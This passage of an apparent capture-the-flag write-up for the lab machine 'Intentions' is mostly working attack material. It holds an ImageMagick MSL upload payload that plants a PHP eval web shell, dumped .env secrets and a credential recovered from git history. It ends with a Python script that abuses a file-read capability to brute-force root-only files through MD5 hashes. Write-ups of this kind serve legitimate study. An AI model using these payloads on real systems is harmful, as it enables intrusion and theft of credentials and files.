+Cookie: XSRF-TOKEN=eyJpdiI6Ii9WcC9tN3NkTXZPNzk4d1RRZ241QXc9PSIsInZhbHVlIjoiV1FZbHd1bnRqcHRyTUlQWGhmU3FaZTFZRVY5ZVhWSmpESmR4cWRLRmpxUDJKU3RGNmZqMlU5QnBsSXdDWFJ0RHlFL0hyaFdTWDJNY2ZVTFdFbHpvN1JSUzY0N2RuRFVhQnd2ZTZseDFiOEdVakxSTlRNcnBSY0ZQcHNXcHZMbWsiLCJtYWMiOiJkZjZkMzQzN2EyMGI3M2Q4YWQyODI2NDdlNzM3OGE3ODg0MjUwOGI1ZTA3YjA1YjMxODZhN2MyNGQ2YWI3MDUyIiwidGFnIjoiIn0%3D; intentions_session=eyJpdiI6Ilo3RDZ5T09QOFJyaWR1YXVxNk12MXc9PSIsInZhbHVlIjoiNkM3U2hzU1N6Z0w4TFl3SC9MQWQ2bzdxVW53cVhwNzMva01teWIxejY0WlFOekN0RmxlcXdsLzFiaDRJdDJWcVNYZ1FNOEEwVllkc3hWblhxUjJMdGcyKzNDalRuUTZ4NjFOR3UydTVjcTVjOHNZRWszMVR3N0R3UFNaRHplekMiLCJtYWMiOiI1YmZkZGI4YzFhOTIyNTQ2MzBhZTA5NjYyM2E1YTA0OTUyNjY2NmE4OGEzNjI0NTc1MjllZmNjN2E0ZTMxZDZkIiwidGFnIjoiIn0%3D; token=eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJpc3MiOiJodHRwOi8vaW50ZW50aW9ucy5odGIvYXBpL3YyL2F1dGgvbG9naW4iLCJpYXQiOjE2ODg2NzkwMTQsImV4cCI6MTY4ODcwMDYxNCwibmJmIjoxNjg4Njc5MDE0LCJqdGkiOiJycHJqSkZFc2MyaG1xV0ZvIiwic3ViIjoiMiIsInBydiI6IjIzYmQ1Yzg5NDlmNjAwYWRiMzllNzAxYzQwMDg3MmRiN2E1OTc2ZjcifQ.qfIZjX83qGbm_Fm3wkVntEs0epLWpnlxksyDhcxElNg
+Content-Type: multipart/form-data; boundary=ABC
+
+--ABC
+Content-Disposition: form-data; name=&quot;swarm&quot;; filename=&quot;swarm.msl&quot;
+Content-Type: text/plain
+
+&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;
+&lt;image&gt;
+&lt;read filename=&quot;caption:&amp;lt;?php @eval(@$_REQUEST[&#x27;cmd&#x27;]); ?&amp;gt;&quot; /&gt;
+&lt;write filename=&quot;info:/var/www/html/intentions/public/shell.php&quot; /&gt;
+&lt;/image&gt;
+--ABC
+Content-Disposition: form-data; name=&quot;path&quot;
+
+vid:msl:/tmp/php*
+--ABC
+Content-Disposition: form-data; name=&quot;effect&quot;
+
+charcoal
+
+--ABC</code></pre><p id="d40d3dd5-c98e-4532-ab5d-da763cf7f1e9" class="">
+</p><p id="46d9994e-81fc-4973-9957-183e63be3543" class="">
+</p><p id="cae27c8f-8a08-4827-8aa3-7107f30c0a3f" class="">Proof</p><figure id="c0b7d833-c172-4974-9bcd-d30457d95ebe" class="image"><a href="Intentions%2026a783edec694ed899ec53c58dc94a67/Untitled%204.png"><img style="width:1169px" src="Intentions%2026a783edec694ed899ec53c58dc94a67/Untitled%204.png"/></a></figure><p id="a8d5b759-9f3a-4361-886b-e204154fa995" class="">
+</p><p id="6373e8df-d1c8-4f2c-a7af-b6db0ccf1e79" class="">
+</p><p id="b6cc7ea5-f9d2-4005-9053-2536b26addd4" class="">Found a password and a directory</p><p id="f0c3c23c-e1db-424f-b7b2-ddd59bff4fc1" class=""><code>/var/www/html/intentions/.env</code></p><p id="9d8f3214-bc37-4dd6-a714-098f4fd01d59" class=""><code>DB_PASSWORD=02mDWOgsOga03G385!!3Plcx</code></p><p id="2b9d9c6f-d59d-458e-acdc-1b6c790c1a65" class=""><code>APP_KEY=base64:YDGHFO792XTVdInb9gGESbGCyRDsAIRCkKoIMwkyHHI=</code></p><p id="38449a5d-d146-457f-893e-36b35a3c7125" class="">
+</p><p id="653f33e0-ce8c-4c44-8d8c-291f4143a13f" class="">JWT secret?</p><p id="43293d23-2b30-4762-86f1-956365d3a3b0" class=""><code>MIX_PUSHER_APP_CLUSTER=&quot;${PUSHER_APP_CLUSTER}&quot;<br/>JWT_SECRET=yVH9RCGPMXyzNLoXrEsOl0klZi3MAxMHcMlRAnlobuSO8WNtLHStPiOUUgfmbwPt<br/></code></p><p id="1b3cd0af-7955-47a1-9f06-d2c8b68dcca1" class="">
+</p><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="97fa3cff-76a7-4b4c-8546-2fa486344e3e" class="code"><code class="language-Rust">╔══════════╣ Searching passwords in config PHP files
+        &#x27;password&#x27; =&gt; &#x27;02mDWOgsOga03G385!!3Plcx&#x27;,
+        &#x27;password&#x27; =&gt; NULL,
+      &#x27;Password&#x27; =&gt; &#x27;Illuminate\\Support\\Facades\\Password&#x27;,
+      &#x27;passwords&#x27; =&gt; &#x27;users&#x27;,
+    &#x27;password_timeout&#x27; =&gt; 10800,
+    &#x27;passwords&#x27; =&gt; 
+            &#x27;password&#x27; =&gt; env(&#x27;DB_PASSWORD&#x27;, &#x27;&#x27;),
+            &#x27;password&#x27; =&gt; env(&#x27;REDIS_PASSWORD&#x27;, null),</code></pre><p id="9052bdc2-b424-49b5-8e66-9c83d6492b18" class="">
+</p><p id="ebdf9228-e404-4385-b8a3-2f8481e8c21c" class="">
+</p><p id="2c9f0bb0-b601-44b4-b3af-108150fe59b7" class="">/etc/ImageMagick-6/mime.xml</p><p id="8197f019-9a51-4164-b102-436a389ee9d6" class="">/etc/ssh/ssh_host_rsa_key.pub</p><p id="515ef0a0-5b31-424f-82eb-d94c70a51557" class="">/var/www/html/intentions/vendor/namshi/jose/tests/private.key</p><p id="d504018e-f90b-40b5-a189-83445d3af96c" class="">/var/www/html/intentions/vendor/namshi/jose/tests/Namshi/JOSE/Test/Signer/OpenSSL/KeyFormatTest.php</p><p id="8b2d12a5-e940-4212-aa83-93c3f55e2567" class="">
+</p><p id="fbff542c-41ca-419e-be06-9eaff9a913c3" class="">ALl keys:</p><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="5bd4141d-7684-4627-8cef-c9bc8a6b364a" class="code"><code class="language-Rust">/etc/ImageMagick-6/mime.xml
+/var/www/html/intentions/vendor/namshi/jose/tests/private.es384.key
+/var/www/html/intentions/vendor/namshi/jose/tests/private.key
+/var/www/html/intentions/vendor/namshi/jose/tests/private.es256.key
+/var/www/html/intentions/vendor/namshi/jose/tests/Namshi/JOSE/Test/Signer/OpenSSL/KeyFormatTest.php
+/var/www/html/intentions/vendor/namshi/jose/tests/private.es512.key
+/var/www/html/intentions/node_modules/selfsigned/README.md
+/var/www/html/intentions/node_modules/spdy/test/fixtures.js
+/var/www/html/intentions/node_modules/public-encrypt/test/rsa.2028.priv
+/var/www/html/intentions/node_modules/public-encrypt/test/ec.priv
+/var/www/html/intentions/node_modules/public-encrypt/test/test_rsa_privkey.pem
+/var/www/html/intentions/node_modules/public-encrypt/test/test_rsa_privkey_encrypted.pem
+/var/www/html/intentions/node_modules/public-encrypt/test/pass.1024.priv
+/var/www/html/intentions/node_modules/public-encrypt/test/test_key.pem
+/var/www/html/intentions/node_modules/public-encrypt/test/rsa.1024.priv
+/var/www/html/intentions/node_modules/public-encrypt/test/ec.pass.priv
+/var/www/html/intentions/node_modules/public-encrypt/test/rsa.pass.priv</code></pre><p id="2a4c2ff2-1d96-41da-9d98-3be1e21f3b0e" class="">
+</p><p id="b5a0bdb1-c428-4387-a034-b0b7a0d4245d" class="">Find writable directories</p><p id="d41a9ac7-7aec-49c7-a422-c4486ed9b8ea" class=""><code>find / -type d -writable 2&gt;/dev/null</code></p><p id="41f8908f-7b30-4cdb-884a-7c32870b4085" class="">
+</p><p id="b692e5dd-a138-428a-aa6d-8c64bfc3cc02" class="">we found the .git directory inside of the web folder</p><p id="1ee21c96-3698-401c-b3bc-8151857c1170" class="">
+</p><p id="5aee9ce6-faea-4d00-9e91-064a8ddacc9b" class="">Decided to clone in inside of a writable dir we have </p><p id="c7228364-71b9-4983-b96f-13c0e086dac8" class=""><code>git clone --bare /var/www/html/intentions/.git /var/www/html/intentions/public/new.git</code></p><p id="603e9987-6237-487b-b86b-e2ab1ffb556f" class="">
+</p><p id="93293eb0-47e0-4987-ab78-472c3197b31d" class="">Now we can access the git repo that we cloned</p><p id="5d6618d6-bc1c-4118-b91f-e9e2a0e4ed9d" class=""><code>git log</code></p><p id="bf20b7c6-40f4-4611-a543-1a60add3be6e" class="">
+</p><p id="d296b637-38e9-4e69-a143-ebbea716693c" class="">And we get a list of logs</p><p id="6f49a573-c8fa-403c-85c4-0217051a39d5" class="">Picked the first one and there is a password for greg!</p><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="149f277b-cb8c-487e-9dba-a0c7d70b0c2a" class="code"><code class="language-Rust">www-data@intentions:~/html/intentions/public/new.git$ git log
+git log
+commit 1f29dfde45c21be67bb2452b46d091888ed049c3 (HEAD -&gt; master)
+Author: steve &lt;steve@intentions.htb&gt;
+Date:   Mon Jan 30 15:29:12 2023 +0100
+
+    Fix webpack for production
+
+commit f7c903a54cacc4b8f27e00dbf5b0eae4c16c3bb4
+Author: greg &lt;greg@intentions.htb&gt;
+Date:   Thu Jan 26 09:21:52 2023 +0100
+
+    Test cases did not work on steve&#x27;s local database, switching to user factory per his advice
+
+commit 36b4287cf2fb356d868e71dc1ac90fc8fa99d319
+Author: greg &lt;greg@intentions.htb&gt;
+Date:   Wed Jan 25 20:45:12 2023 +0100
+
+    Adding test cases for the API!
+
+commit d7ef022d3bc4e6d02b127fd7dcc29c78047f31bd
+Author: steve &lt;steve@intentions.htb&gt;
+Date:   Fri Jan 20 14:19:32 2023 +0100
+
+:
+    Initial v2 commit
+:
+(END)
+(END)
+(END)
+(END)
+(END)
+(END)
+(END)
+(END)
+(END)q
+www-data@intentions:~/html/intentions/public/new.git$ 
+www-data@intentions:~/html/intentions/public/new.git$ git show f7c903a54cacc4b8f27e00dbf5b0eae4c16c3bb4</code></pre><p id="8ac3af8d-4bc5-4a6d-86de-024f7684341a" class="">
+</p><p id="8ff3f330-ec7d-44aa-8a23-7133d5677e00" class="">The content of the commit:</p><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="71a5868f-3c4f-401c-995e-f60d720227aa" class="code"><code class="language-Rust">git show f7c903a54cacc4b8f27e00dbf5b0eae4c16c3bb4
+commit f7c903a54cacc4b8f27e00dbf5b0eae4c16c3bb4
+Author: greg &lt;greg@intentions.htb&gt;
+Date:   Thu Jan 26 09:21:52 2023 +0100
+
+    Test cases did not work on steve&#x27;s local database, switching to user factory per his advice
+
+diff --git a/tests/Feature/Helper.php b/tests/Feature/Helper.php
+index f57e37b..0586d51 100644
+--- a/tests/Feature/Helper.php
++++ b/tests/Feature/Helper.php
+@@ -8,12 +8,14 @@ class Helper extends TestCase
+ {
+     public static function getToken($test, $admin = false) {
+         if($admin) {
+-            $res = $test-&gt;postJson(&#x27;/api/v1/auth/login&#x27;, [&#x27;email&#x27; =&gt; &#x27;greg@intentions.htb&#x27;, &#x27;password&#x27; =&gt; &#x27;Gr3g1sTh3B3stDev3l0per!1998!&#x27;]);
+-            return $res-&gt;headers-&gt;get(&#x27;Authorization&#x27;);
++            $user = User::factory()-&gt;admin()-&gt;create();
+         } 
+         else {
+-            $res = $test-&gt;postJson(&#x27;/api/v1/auth/login&#x27;, [&#x27;email&#x27; =&gt; &#x27;greg_user@intentions.htb&#x27;, &#x27;password&#x27; =&gt; &#x27;Gr3g1sTh3B3stDev3l0per!1998!&#x27;]);
+:</code></pre><p id="afecbd59-6f76-4535-8c9e-c8dbe7d06b36" class="">
+</p><p id="96eafc06-1965-450d-b771-11a8a2f22946" class="">And we have credentials!</p><p id="ebd2503c-1f3d-47fa-95fd-1bf2102c67f8" class="">greg@intentions.htb, </p><p id="a1fdb093-bc9e-4e70-bc47-8d9aa3400091" class="">&#x27;password&#x27; =&gt; Gr3g1sTh3B3stDev3l0per!1998!</p><p id="60c1e004-9362-4533-9e86-280ccd6f1c42" class="">
+</p><p id="ee391388-94a4-4e9c-8fe0-42d2da306f73" class=""><mark class="highlight-teal">User: 591211d7f39131b6511faa66af6051cf</mark></p><p id="78a056ef-d41a-468c-b959-0cedba383c2e" class="">
+</p><hr id="97c0def6-2ab6-4bc9-960f-2ca218f88b2d"/><hr id="5dcee6b8-9834-4dd2-b262-b5ea18d077e4"/><hr id="91864897-d3de-4831-93a2-9ab9edfe1de6"/><p id="5e215f66-e3c1-4418-a0c0-3af35161d07d" class="">
+</p><p id="d28016f6-0c62-4861-a7d1-210ba88d615b" class="">Road to root:</p><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="893e3bc1-3df1-4a7b-b419-ee0cb5846188" class="code"><code class="language-Rust">$ sudo -l
+[sudo] password for greg: 
+Sorry, user greg may not run sudo on intentions.
+$ cat dmca_check.sh
+/opt/scanner/scanner -d /home/legal/uploads -h /home/greg/dmca_hashes.test</code></pre><p id="d51e2901-b39c-4bb8-87a9-061e76602d26" class="">
+</p><p id="b8eae913-708a-4328-baec-e8adc384c3b0" class="">So what does the scanner do?</p><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="46971d92-c496-4523-9230-c258ebb2e0f4" class="code"><code class="language-Rust">$ /opt/scanner/scanner -h
+flag needs an argument: -h
+The copyright_scanner application provides the capability to evaluate a single file or directory of files against a known blacklist and return matches.
+
+        This utility has been developed to help identify copyrighted material that have previously been submitted on the platform.
+        This tool can also be used to check for duplicate images to avoid having multiple of the same photos in the gallery.
+        File matching are evaluated by comparing an MD5 hash of the file contents or a portion of the file contents against those submitted in the hash file.
+
+        The hash blacklist file should be maintained as a single LABEL:MD5 per line.
+        Please avoid using extra colons in the label as that is not currently supported.
+
+        Expected output:
+        1. Empty if no matches found
+        2. A line for every match, example:
+                [+] {LABEL} matches {FILE}
+
+  -c string
+        Path to image file to check. Cannot be combined with -d
+  -d string
+        Path to image directory to check. Cannot be combined with -c
+  -h string
+        Path to colon separated hash file. Not compatible with -p
+  -l int
+        Maximum bytes of files being checked to hash. Files smaller than this value will be fully hashed. Smaller values are much faster but prone to false positives. (default 500)
+  -p    [Debug] Print calculated file hash. Only compatible with -c
+  -s string
+        Specific hash to check against. Not compatible with -h</code></pre><p id="a404dbea-743c-4bd9-9c34-2b1f6d466c44" class="">
+</p><p id="c94a4766-ec79-4a20-99c8-33b17aa4675d" class="">W can check some permissions for the scanner binary</p><p id="ada2f586-31b1-4472-b324-11d56c0391de" class=""><code>getcap -r /opt/scanner/scanner</code></p><p id="50b31b7f-9047-428d-9ffd-a3291402f968" class="">
+</p><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="5239ff49-a271-4107-8458-e86bd4e29a70" class="code"><code class="language-Rust">$ getcap -r /opt/scanner/scanner
+/opt/scanner/scanner cap_dac_read_search=ep</code></pre><p id="47e28347-a726-4c7b-821f-2be45483fc0d" class="">
+</p><p id="cd4f6bff-e9b0-409f-b5ef-e9759c3e9618" class="">Testing</p><p id="c3fa6f0a-ca9b-4185-949d-eba112022281" class=""><code>/opt/scanner/scanner -c /etc/shadow -s 1234 -p</code></p><p id="3219b1e3-5cac-458b-b062-6ed4633f54d5" class="">
+</p><p id="0e633c74-3e0a-4528-b255-eeaeb4b799c4" class="">Is this how it works?</p><p id="3e6eec18-1bed-4858-baa6-3ccb60820065" class=""><code>/opt/scanner/scanner -c /root/root.txt -s 1234 -p</code></p><p id="6641e0e2-d122-400c-a171-b2024425cec9" class="">
+</p><p id="4eb7d9aa-5063-4ee5-bed3-a5911fe918d4" class="">Brute forcing the root.txt file and getting the content</p><p id="49af2087-9eef-4c6e-834a-76e5c97de4af" class="">
+</p><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="2f7e95dd-9e0a-41d5-ba7b-6101a3ea57b1" class="code"><code class="language-Rust">import hashlib
+import os
+import string
+
+charset = string.printable
+result = &quot;&quot;
+
+def get_hash(filename, length):
+    command = f&quot;/opt/scanner/scanner -c {filename} -l {length} -p -s 1234&quot;
+    output = os.popen(command).read().split(&quot; &quot;)[-1].rstrip()
+    return output
+
+def find_character(target_hash):
+    global result  # make sure to use the global &#x27;result&#x27; variable
+    for char in charset:
+        test_data = result + char
+        current_hash = hashlib.md5(test_data.encode()).hexdigest()
+        if target_hash == current_hash:
+            return char
+    return None
+
+def main():
+    global result  # make sure to use the global &#x27;result&#x27; variable
+    filename = input(&quot;File-Name: &quot;)
+    i = 1
+    while True:
+        target_hash = get_hash(filename, i)
+        new_char = find_character(target_hash)
+        if new_char is None:
+            break
+        result += new_char
+        i += 1
+    print(result)
+
+if __name__ == &quot;__main__&quot;:
+    main()</code></pre><p id="1f264c1b-8685-4ff3-9449-57ab55277d86" class="">
+</p><p id="1dc4339b-fa66-4263-9970-df7426fa5c71" class=""><mark class="highlight-teal">root.txt: 0db69bd81f71061a2808739d635f55f4</mark></p><p id="94e570ac-4118-44ef-be10-bc3dda76a06e" class="">
+</p></div></article><span class="sans" style="font-size:14px;padding-top:2em"></span></body></html>
